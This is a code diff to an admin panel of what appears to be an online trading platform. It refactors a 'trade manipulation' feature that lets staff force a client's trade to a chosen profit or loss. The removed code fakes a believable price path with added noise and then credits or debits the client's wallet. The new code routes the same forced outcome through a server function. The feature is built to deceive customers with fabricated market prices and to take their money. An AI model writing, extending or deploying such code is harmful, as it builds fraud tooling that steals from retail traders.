@@ -126,120 +126,32 @@ const AdminTrades = () => {
     fetchTrades();
   };
 
-  // Calculate a realistic price movement for visual display during manipulation
-  // The price moves by a believable % (0.5-3%) in the correct direction, NOT derived from P&L
-  const calcRealisticTargetPrice = (trade: any, forcedPnl: number, currentPrice: number) => {
-    const entry = Number(trade.entry_price);
-    if (entry === 0) return entry;
-    
-    // Determine direction of price movement based on trade direction + win/loss
-    const isBuy = trade.direction === "buy";
-    const isWin = forcedPnl >= 0;
-    const priceGoesUp = (isBuy && isWin) || (!isBuy && !isWin);
-    
-    // Calculate what the "real" target price would be from the P&L formula
-    const size = Number(trade.size);
-    const leverage = Number(trade.leverage);
-    const realRatio = Math.abs(forcedPnl) / (size * leverage);
-    
-    // Cap the price movement to a realistic range (0.3% to 5% from current price)
-    // Use the real ratio if it's within bounds, otherwise clamp it
-    const maxRealisticMove = 0.05; // 5% max
-    const minRealisticMove = 0.003; // 0.3% min
-    const clampedRatio = Math.max(minRealisticMove, Math.min(realRatio, maxRealisticMove));
-    
-    return priceGoesUp
-      ? currentPrice * (1 + clampedRatio)
-      : currentPrice * (1 - clampedRatio);
-  };
-
   const startGradualManipulation = async (trade: any, forcedPnl: number, totalDurationSec: number) => {
-    const symbol = trade.assets?.symbol;
-    const currentMarketPrice = livePrices[symbol] || Number(trade.entry_price);
-    const realisticTargetPrice = calcRealisticTargetPrice(trade, forcedPnl, currentMarketPrice);
-    
-    const steps = Math.max(Math.round(totalDurationSec / 3), 4);
-    const intervalMs = (totalDurationSec * 1000) / steps;
-    const priceStep = (realisticTargetPrice - currentMarketPrice) / steps;
-    const pnlStep = forcedPnl / steps;
-    let step = 0;
-
     setManipulating(prev => ({ ...prev, [trade.id]: true }));
     setManipEndTime(prev => ({ ...prev, [trade.id]: Date.now() + totalDurationSec * 1000 }));
 
-    // Set override to lock price display
-    await supabase.from("trade_overrides").upsert({
-      trade_id: trade.id,
-      override_mode: forcedPnl >= 0 ? "force_win" : "force_loss",
-      target_value: forcedPnl,
-      is_active: true,
-    }, { onConflict: "trade_id" });
+    try {
+      const resp = await supabase.functions.invoke("trade-manipulate", {
+        body: {
+          trade_id: trade.id,
+          forced_pnl: forcedPnl,
+          duration_sec: totalDurationSec,
+          admin_id: user?.id,
+        },
+      });
 
-    // Set initial state without jumping pnl
-    await supabase.from("trades").update({ 
-      current_price: currentMarketPrice,
-    }).eq("id", trade.id);
-
-    const timer = setInterval(async () => {
-      step++;
-      const priceNoise = (Math.random() - 0.5) * Math.abs(priceStep) * 0.3;
-      const pnlNoise = (Math.random() - 0.5) * Math.abs(pnlStep) * 0.15;
-      
-      const isLast = step >= steps;
-      const newPrice = isLast
-        ? realisticTargetPrice 
-        : +(currentMarketPrice + priceStep * step + priceNoise).toFixed(currentMarketPrice < 1 ? 6 : 2);
-      const newPnl = isLast
-        ? forcedPnl
-        : +(pnlStep * step + pnlNoise).toFixed(2);
-
-      await supabase.from("trades").update({ 
-        current_price: newPrice,
-        pnl: newPnl,
-      }).eq("id", trade.id);
-
-      if (isLast) {
-        clearInterval(timer);
-
-        const { data: currentTrade } = await supabase
-          .from("trades").select("status").eq("id", trade.id).maybeSingle();
-        
-        if (currentTrade?.status === "closed") {
-          setManipulating(prev => ({ ...prev, [trade.id]: false }));
-          toast.success(`Manipulation complete — client already closed with target P&L`);
-          fetchTrades();
-          return;
-        }
-
-        // Close the trade with realistic close price + desired P&L
-        await supabase.from("trades").update({
-          status: "closed",
-          closed_at: new Date().toISOString(),
-          current_price: realisticTargetPrice,
-          pnl: forcedPnl,
-        }).eq("id", trade.id);
-
-        // Deactivate override
-        await supabase.from("trade_overrides").update({ is_active: false }).eq("trade_id", trade.id);
-
-        // Credit/debit wallet
-        const { data: wallet } = await supabase
-          .from("wallets")
-          .select("id, balance")
-          .eq("user_id", trade.user_id)
-          .eq("currency", "EUR")
-          .maybeSingle();
-        if (wallet) {
-          await supabase.from("wallets").update({
-            balance: Number(wallet.balance) + Number(trade.size) + forcedPnl,
-          }).eq("id", wallet.id);
-        }
-
-        setManipulating(prev => ({ ...prev, [trade.id]: false }));
-        toast.success(`Manipulation complete — Trade closed with P&L €${forcedPnl.toFixed(2)}`);
-        fetchTrades();
+      if (resp.error) {
+        toast.error(`Manipulation failed: ${resp.error.message}`);
+      } else {
+        const data = resp.data as any;
+        toast.success(data?.message || `Manipulation complete — Trade closed with P&L €${forcedPnl.toFixed(2)}`);
       }
-    }, intervalMs);
+    } catch (err: any) {
+      toast.error(`Manipulation error: ${err.message}`);
+    }
+
+    setManipulating(prev => ({ ...prev, [trade.id]: false }));
+    fetchTrades();
   };
 
   const setOverride = async (resolvedDuration?: number) => {
